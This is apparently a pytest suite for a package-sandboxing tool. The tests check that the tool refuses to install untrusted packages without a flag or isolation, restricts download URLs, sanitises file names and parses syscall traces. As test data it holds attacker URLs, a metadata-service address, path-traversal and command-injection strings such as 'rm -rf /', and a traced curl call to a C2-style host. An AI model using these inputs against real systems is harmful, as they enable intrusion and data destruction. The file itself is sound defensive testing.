"""The component that runs untrusted code, and what it refuses to do.

Nothing here executes anything. The tests that matter most are about refusal:
the flag that has to be typed, the isolation that has to exist, and the fact
that neither has an override. Those are the properties that make the component
safe to ship, and they are testable without a container runtime -- which is
important, because a test suite that needs one would skip exactly the assertions
that matter on the machines that do not have one.

The parts that need a runtime are marked and skipped when it is absent, rather
than silently passing.
"""

from __future__ import annotations

import functools
import subprocess
import unittest.mock

import pytest

from cordon_sandbox import cli
from cordon_sandbox.fetch import _check_url, _ValidatingRedirect, safe_artefact_name
from cordon_sandbox.isolation import Backend, IsolationError, available_backend
from cordon_sandbox.observe import (
    HOME_DIR,
    HOME_SENTINEL,
    OBSERVATION_SEVERITY,
    PERSISTENCE_PREFIXES,
    TRACE_SENTINEL,
    Observation,
    _interpret,
    _interpret_trace,
    _split_trace,
    install_command,
    meets_threshold,
    traced_command,
)


@functools.cache
def has_runtime() -> bool:
    """Whether a container runtime is usable here.

    Cached because this is evaluated at import time by the `skipif` decorators
    below, and each call probes every runtime on `PATH`. On a machine where
    Docker is installed and stopped those probes sit until their timeout, and
    paying that once per decorator turns test collection into a minute of
    nothing.
    """
    try:
        available_backend()
    except IsolationError:
        return False
    return True


class TestItRefusesByDefault:
    def test_nothing_runs_without_the_flag(self, capsys) -> None:
        """The flag carries no information the command does not already imply.
        It exists so that running untrusted code is never something somebody
        did by accident."""
        assert cli.main(["pypi", "requests"]) == cli.BAD_INVOCATION
        assert "Pass --sandbox" in capsys.readouterr().err

    def test_the_refusal_explains_itself(self, capsys) -> None:
        cli.main(["npm", "left-pad"])
        assert "installs and runs the package you name" in capsys.readouterr().err

    def test_the_help_says_it_executes(self) -> None:
        text = cli.build_parser().format_help()
        assert "EXECUTES" in text


class TestItRefusesWithoutIsolation:
    def test_a_missing_runtime_is_an_error_not_a_warning(self, monkeypatch, capsys) -> None:
        """A sandbox that degrades to running untrusted code on the host when
        its backend is missing is worse than no sandbox, because the person who
        asked for it believes they are protected."""
        monkeypatch.setattr(
            "cordon_sandbox.cli.available_backend",
            lambda: (_ for _ in ()).throw(IsolationError("no container runtime is available")),
        )
        assert cli.main(["pypi", "requests", "--sandbox"]) == cli.FAILED
        assert "no container runtime" in capsys.readouterr().err

    def test_there_is_no_override(self) -> None:
        """Asserted against the parser rather than trusted to review: an
        `--allow-unsafe` added later would silently remove the property this
        whole component rests on."""
        options = cli.build_parser().format_help()
        for forbidden in ("--force", "--allow-unsafe", "--no-isolation", "--unsafe"):
            assert forbidden not in options

    def test_isolation_is_established_before_anything_is_downloaded(self, monkeypatch) -> None:
        """A missing runtime should be discovered before the network is
        touched, so a refusal costs nothing and leaks nothing."""
        order: list[str] = []

        def backend():
            order.append("isolation")
            raise IsolationError("none")

        def fetch(ecosystem, package):  # pragma: no cover - must not be reached
            order.append("fetch")
            raise AssertionError("fetched before isolation was established")

        monkeypatch.setattr("cordon_sandbox.cli.available_backend", backend)
        monkeypatch.setattr("cordon_sandbox.cli.fetch", fetch)
        cli.main(["pypi", "requests", "--sandbox"])
        assert order == ["isolation"]


class TestTheScannerCannotReachIt:
    def test_the_scanner_does_not_import_the_sandbox(self) -> None:
        """The scanner's promise is that it never executes what it scans, and a
        promise with an entry point into execution is not one."""
        import subprocess
        import sys

        probe = subprocess.run(
            [
                sys.executable,
                "-c",
                "import cordon_scanner, cordon_scanner.cli.main, sys; "
                "print(any(m.startswith('cordon_sandbox') for m in sys.modules))",
            ],
            capture_output=True,
            text=True,
            check=True,
        )
        assert probe.stdout.strip() == "False"


class TestWhatItSaysAboutIsolation:
    def test_a_rootless_runtime_says_so(self) -> None:
        claims = Backend(command="podman", version="5", rootless=True).guarantees
        assert any("rootless" in c for c in claims)

    def test_a_root_owned_runtime_says_that_is_weaker(self) -> None:
        claims = Backend(command="docker", version="27", rootless=False).guarantees
        assert any("weaker" in c for c in claims)

    def test_it_never_claims_a_read_only_root(self) -> None:
        """It used to, and the claim made the component useless: a payload
        writing to /etc/cron.d simply failed, and the run reported "the install
        failed" rather than "it tried to persist"."""
        for rootless in (True, False):
            claims = Backend(command="x", version="1", rootless=rootless).guarantees
            assert not any("read-only root" in c for c in claims)
            assert any("discarded afterwards" in c for c in claims)


class TestInterpretation:
    def test_writes_outside_the_install_tree_are_persistence(self) -> None:
        diff = "A /etc/cron.d/updater\nC /usr/local/bin\nA /work/site/six.py\n"
        kinds = [o.kind for o in _interpret(diff, 0, timed_out=False, home_listing_output="")]
        assert kinds == ["persistence"]

    def test_ordinary_install_writes_are_not_reported(self) -> None:
        diff = "A /work/site/six.py\nC /work\nA /tmp/pip-build\n"
        assert _interpret(diff, 0, timed_out=False, home_listing_output="") == []

    def test_a_timeout_says_what_was_not_observed(self) -> None:
        observations = _interpret("", -1, timed_out=True, home_listing_output="")
        assert observations[0].kind == "timeout"
        assert "not observed" in observations[0].detail

    def test_every_persistence_prefix_is_outside_a_package_tree(self) -> None:
        for prefix in PERSISTENCE_PREFIXES:
            assert not prefix.startswith(("/work", "/tmp"))


class TestTheGate:
    """A CI pipeline gates a static scan with `--fail-on`; a dynamic run has to
    be gateable the same way, or the observations it makes cannot participate in
    the decision the pipeline exists to make. The two binaries stay separate --
    the scanner never executes what it scans -- so the gate lives here, mapping
    each observation kind to the same severity scale the scanner uses.
    """

    def test_a_high_observation_clears_a_high_gate(self) -> None:
        obs = (Observation("persistence", "x"),)
        assert meets_threshold(obs, "high")
        assert not meets_threshold(obs, "critical")

    def test_a_low_observation_does_not_clear_a_medium_gate(self) -> None:
        assert not meets_threshold((Observation("install_failed", "x"),), "medium")

    def test_an_unwatched_run_clears_a_medium_gate(self) -> None:
        """A run that could not be fully observed is not a clean run: an
        untraced run and an un-enumerated install directory are both medium, so
        a gate set there treats them as the unfinished checks they are."""
        assert meets_threshold((Observation("not_traced", "x"),), "medium")
        assert meets_threshold((Observation("not_observed", "x"),), "medium")

    def test_every_observation_kind_has_a_severity(self) -> None:
        """A kind with no mapping would default to low and quietly never gate.
        Every kind `observe` can emit must be scored on purpose."""
        emitted = {
            "persistence",
            "attempted_egress",
            "executed",
            "timeout",
            "not_traced",
            "not_observed",
            "install_failed",
        }
        assert emitted <= set(OBSERVATION_SEVERITY)


class TestWhereTheFetcherWillGo:
    """The artefact URL is not written in this codebase. It arrives as
    `releases[].url` or `dist.tarball` in the registry's response -- a field
    the package's own publisher has a say in -- and `urlopen` follows a
    redirect without re-checking anything.
    """

    @pytest.mark.parametrize(
        "url",
        [
            "http://files.pythonhosted.org/x",
            "https://attacker.invalid/x",
            "https://169.254.169.254/latest/meta-data/",
            "https://files.pythonhosted.org@attacker.invalid/x",
            "file:///etc/passwd",
        ],
    )
    def test_a_host_off_the_allowlist_is_refused(self, url) -> None:
        with pytest.raises(IsolationError):
            _check_url(url)

    def test_the_real_registries_are_allowed(self) -> None:
        for url in (
            "https://pypi.org/pypi/six/json",
            "https://files.pythonhosted.org/packages/x/six-1.16.0.tar.gz",
            "https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz",
        ):
            _check_url(url)

    def test_a_redirect_is_re_checked_rather_than_followed(self) -> None:
        """The check on the URL that was asked for says nothing about where the
        request ends up."""
        handler = _ValidatingRedirect()
        with pytest.raises(IsolationError):
            handler.redirect_request(
                None, None, 302, "Found", {}, "https://attacker.invalid/payload"
            )


class TestTheArtefactFilename:
    """`chosen.get("filename")` is the publisher's, and the publisher is the
    adversary. `shlex.quote` stops injection and does nothing about `../`."""

    @pytest.mark.parametrize(
        ("raw", "expected"),
        [
            ("../.cordon-trace", "cordon-trace"),
            ("../../etc/passwd", "passwd"),
            (".cordon-trace", "cordon-trace"),
            ("/work/.cordon-trace", "cordon-trace"),
            ("", "fallback.tar.gz"),
        ],
    )
    def test_a_traversal_cannot_reach_the_observers_own_files(self, raw, expected) -> None:
        assert safe_artefact_name(raw, "fallback.tar.gz") == expected

    def test_an_ordinary_name_is_left_alone(self) -> None:
        assert safe_artefact_name("six-1.16.0.tar.gz", "x") == "six-1.16.0.tar.gz"

    def test_the_result_is_always_a_single_harmless_segment(self) -> None:
        for raw in ("a b; rm -rf /", "x/../../y", "$(whoami)", "..", "."):
            cleaned = safe_artefact_name(raw, "fallback.tgz")
            assert "/" not in cleaned
            assert not cleaned.startswith(".")
            assert cleaned


class TestTheInstallDirectoryIsObserved:
    """`$HOME` is the tmpfs the install runs in, and `docker diff` reports the
    container's overlay layer -- which a tmpfs is not part of. So every write a
    package made under `$HOME` was invisible: the diff showed `A /work`, the
    bare mount point, and never a path beneath it.

    Worse in combination. On a host that denies `ptrace` the syscall tier is
    dark as well, so a package that wrote `$HOME/.ssh/authorized_keys` and
    attempted egress could produce a report with no observations at all, for
    two unrelated structural reasons.
    """

    def test_a_shell_profile_written_under_home_is_persistence(self) -> None:
        listing = f"{HOME_DIR}/.bashrc\n{HOME_DIR}/.cordon-trace\n"
        kinds = [o.kind for o in _interpret("", 0, timed_out=False, home_listing_output=listing)]
        assert "persistence" in kinds

    def test_an_authorized_key_is_persistence(self) -> None:
        listing = f"{HOME_DIR}/.ssh\n{HOME_DIR}/.ssh/authorized_keys\n"
        found = _interpret("", 0, timed_out=False, home_listing_output=listing)
        assert [o.kind for o in found] == ["persistence"]
        assert "authorized_keys" in found[0].detail

    def test_an_ordinary_install_tree_is_not_persistence(self) -> None:
        """pip writes `/work/site` and npm `/work/npm`, and the tracer's own
        file sits there too. An observation that fires on every install is one
        an analyst learns to scroll past."""
        listing = f"{HOME_DIR}/.cordon-trace\n"
        assert _interpret("", 0, timed_out=False, home_listing_output=listing) == []

    def test_a_listing_that_never_arrived_is_said_out_loud(self) -> None:
        found = _interpret("", 0, timed_out=False, home_listing_output=None)
        assert [o.kind for o in found] == ["not_observed"]
        assert HOME_DIR in found[0].detail

    def test_the_listing_command_reaches_into_the_tmpfs(self) -> None:
        """The whole point: run from inside, because nothing outside can see in."""
        command = traced_command("pip install x")
        assert HOME_SENTINEL in command
        assert f"find {HOME_DIR}" in command
        assert command.index(HOME_SENTINEL) > command.index(TRACE_SENTINEL)


class TestInstallCommands:
    def test_lifecycle_scripts_are_left_enabled(self) -> None:
        """They are the reason to run anything at all. `--ignore-scripts` would
        produce a clean observation of a package whose whole payload is a
        postinstall hook."""
        _, npm = install_command("npm", "pkg.tgz")
        assert "--ignore-scripts" not in npm

    def test_the_install_reads_the_local_artefact_not_the_network(self) -> None:
        _, pip = install_command("pypi", "pkg.tar.gz")
        assert "--no-index" in pip
        _, npm = install_command("npm", "pkg.tgz")
        assert "--offline" in npm

    def test_an_unknown_ecosystem_is_refused(self) -> None:
        with pytest.raises(IsolationError):
            install_command("cargo", "pkg.crate")


@pytest.mark.skipif(not has_runtime(), reason="no container runtime available")
class TestAgainstARealRuntime:
    def test_a_backend_reports_a_version(self) -> None:
        backend = available_backend()
        assert backend.version
        assert backend.command


class TestTheSyscallTrace:
    """What the install ran and what it tried to reach.

    Nothing here starts a container. The trace is a text format, the parser is
    the part that can be wrong, and the shapes it has to survive are exactly
    the ones a real `strace -f` emits.
    """

    EXEC = (
        '2841 execve("/usr/bin/curl", ["curl", "-s", "http://c2.example/x"], 0x7ffd) = 0\n'
        '2841 execve("/bin/sh", ["sh", "-c", "install"], 0x7ffd) = 0\n'
        '2842 execve("/usr/bin/gcc", ["gcc", "-c", "ext.c"], 0x7ffd) = 0\n'
    )
    CONNECT = (
        "2841 connect(5, {sa_family=AF_INET, sin_port=htons(443), "
        'sin_addr=inet_addr("203.0.113.9")}, 16) = -1 ENETUNREACH\n'
    )
    LOOPBACK = (
        "2841 connect(5, {sa_family=AF_INET, sin_port=htons(8080), "
        'sin_addr=inet_addr("127.0.0.1")}, 16) = 0\n'
    )

    def test_a_program_the_build_did_not_need_is_reported(self) -> None:
        kinds = {o.kind: o.detail for o in _interpret_trace(self.EXEC, traced=True)}
        assert "executed" in kinds
        assert "/usr/bin/curl" in kinds["executed"]

    def test_the_toolchain_is_not(self) -> None:
        """An install that compiles an extension runs a compiler, a linker and
        a shell. Reporting those is reporting that a build happened."""
        detail = next(
            o.detail for o in _interpret_trace(self.EXEC, traced=True) if o.kind == "executed"
        )
        assert "gcc" not in detail
        assert "/bin/sh" not in detail

    def test_an_attempted_connection_is_recorded_even_though_it_failed(self) -> None:
        """There is no network interface in the container, so the call could
        not have succeeded. That it was made is the observation."""
        kinds = {o.kind: o.detail for o in _interpret_trace(self.CONNECT, traced=True)}
        assert "attempted_egress" in kinds
        assert "203.0.113.9" in kinds["attempted_egress"]
        assert "443" in kinds["attempted_egress"]

    def test_loopback_is_a_build_talking_to_itself(self) -> None:
        assert not [
            o for o in _interpret_trace(self.LOOPBACK, traced=True) if o.kind == "attempted_egress"
        ]

    def test_an_ipv6_address_is_read_too(self) -> None:
        trace = '2841 connect(5, {sa_family=AF_INET6, inet_pton(AF_INET6, "2001:db8::1", &sin6_addr)}, 28) = -1\n'
        kinds = {o.kind for o in _interpret_trace(trace, traced=True)}
        assert "attempted_egress" in kinds

    def test_an_ordinary_install_says_nothing(self) -> None:
        trace = '2841 execve("/bin/sh", ["sh", "-c", "x"], 0x7ffd) = 0\n'
        assert _interpret_trace(trace, traced=True) == []

    def test_an_untraced_run_says_so_rather_than_saying_nothing_happened(self) -> None:
        """The invariant the whole project is built on: a check that did not
        run must never look like a check that found nothing."""
        observations = _interpret_trace("", traced=False)
        assert [o.kind for o in observations] == ["not_traced"]
        assert "not observed" in observations[0].detail


class TestTheTracedCommand:
    def test_the_installs_exit_status_survives_the_trace_dump(self) -> None:
        """A non-zero exit is itself an observation, and `echo` after the
        install would otherwise overwrite it with zero."""
        command = traced_command("pip install x")
        assert command.rstrip().endswith("exit $rc")

    def test_it_falls_back_to_running_untraced(self) -> None:
        """`strace` exits non-zero when the host denies ptrace. An install that
        did not happen is worth less than one that happened unobserved."""
        assert traced_command("pip install x").count("pip install x") == 2

    def test_the_trace_follows_the_sentinel(self) -> None:
        command = traced_command("pip install x")
        assert command.index(TRACE_SENTINEL) < command.index("head -c")


class TestSplittingTheOutput:
    def test_the_installers_output_stops_at_the_sentinel(self) -> None:
        output, trace, _ = _split_trace(
            f"Successfully installed x\n{TRACE_SENTINEL}\n2841 execve(\n"
        )
        assert output.strip() == "Successfully installed x"
        assert "execve" in trace

    def test_output_with_no_sentinel_yields_no_trace(self) -> None:
        """A container killed at the wall clock never printed it, and reading
        the install's own output as a trace would report whatever it happened
        to contain."""
        output, trace, home = _split_trace("Killed\n")
        assert (output, trace) == ("Killed\n", "")
        assert home is None

    def test_the_home_listing_follows_the_trace(self) -> None:
        _, trace, home = _split_trace(
            f"installed\n{TRACE_SENTINEL}\n2841 execve(\n"
            f"{HOME_SENTINEL}\n/work/.ssh\n/work/.ssh/authorized_keys\n"
        )
        assert "execve" in trace
        assert home is not None
        assert "/work/.ssh/authorized_keys" in home

    def test_a_missing_listing_is_not_an_empty_one(self) -> None:
        """`None` and `""` mean different things here: one is "never looked",
        the other is "looked and found nothing". Collapsing them is how a run
        that did not observe $HOME would read as a run where nothing happened
        in it."""
        _, _, home = _split_trace(f"installed\n{TRACE_SENTINEL}\ntrace\n")
        assert home is None


class TestWhatTheBackendPromises:
    def test_an_untraced_backend_says_so_in_its_guarantees(self) -> None:
        claims = Backend(command="docker", version="1", rootless=False).guarantees
        assert any("NOT traced" in c for c in claims)

    def test_a_traced_one_says_that(self) -> None:
        claims = Backend(
            command="podman", version="1", rootless=True, traces_syscalls=True
        ).guarantees
        assert any("syscalls traced" in c for c in claims)

    def test_the_default_runtime_names_the_host_kernel_as_the_boundary(self) -> None:
        claims = Backend(command="docker", version="1", rootless=False).guarantees
        assert any("host kernel is the boundary" in c for c in claims)

    def test_gvisor_is_named_when_it_is_what_ran(self) -> None:
        claims = Backend(command="docker", version="1", rootless=False, runtime="runsc").guarantees
        assert any("gVisor" in c for c in claims)
        assert not any("host kernel is the boundary" in c for c in claims)


class TestProbingNeverRaises:
    """`available_backend` exists to answer "is there somewhere safe to run
    this" with a sentence rather than a traceback. Anything it calls has to
    hold up its end."""

    @pytest.mark.parametrize(
        "failure",
        [
            subprocess.TimeoutExpired("docker", 10.0),
            subprocess.SubprocessError("broken pipe"),
            OSError("not executable"),
        ],
    )
    def test_a_runtime_that_cannot_answer_has_no_gvisor(self, failure: Exception) -> None:
        """Docker installed and stopped is the ordinary case, and `docker info`
        talks to the daemon: it hangs until the timeout and raises. Unhandled,
        that reached the user as `subprocess.TimeoutExpired` from
        `cordon-sandbox` instead of the refusal that says what to install."""
        from cordon_sandbox import isolation

        with unittest.mock.patch.object(isolation.subprocess, "run", side_effect=failure):
            assert isolation._has_gvisor("docker") is False

    def test_the_backend_probe_survives_a_hanging_runtime(self) -> None:
        """End to end: a `PATH` with a runtime on it that never answers must
        produce the IsolationError, not the timeout."""
        from cordon_sandbox import isolation

        with (
            unittest.mock.patch.object(isolation.shutil, "which", return_value="/usr/bin/docker"),
            unittest.mock.patch.object(
                isolation.subprocess,
                "run",
                side_effect=subprocess.TimeoutExpired("docker", 10.0),
            ),
            pytest.raises(IsolationError),
        ):
            isolation.available_backend()
